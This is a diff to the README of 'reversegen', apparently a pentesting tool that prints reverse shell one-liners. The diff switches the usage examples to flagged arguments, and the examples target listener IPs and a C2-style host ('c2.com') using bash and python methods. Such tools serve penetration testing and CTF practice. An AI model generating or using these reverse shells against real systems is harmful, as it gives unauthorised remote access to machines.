@@ -7,7 +7,7 @@ When executed it prints out the reverse shell (so you can pipe it to `xclip` to 
 To copy the result of the script you can do it like this (it will prevent the script from outputting the reverse shell):
 
 ```
-reversegen bash 10.10.1.14 1234 | xclip -selection clipboard
+reversegen -m bash -i 10.10.1.14 -p 1234 | xclip -selection clipboard
 ```
 
 It also allows getting the IP from the hostname so you can pass as the IP argument an URL like: `google.com`.<br>Having it in `/etc/hosts` will have the script to choose that IP.
@@ -28,9 +28,9 @@ reversegen [-h] -m METHOD -i IP -p PORT [-o FILENAME]
 Example of usage: 
 
 ```
-reversegen python 192.168.1.10 4444
-reversegen python 10.10.1.14 4444 -f ~/rev
-reversegen python c2.com 4444
+reversegen -m python -i 192.168.1.10 -p 4444
+reversegen -m python -i 10.10.1.14 -p 4444 -o ~/rev
+reversegen -m python -i c2.com -p 4444
 ```
 
 ## Available Methods
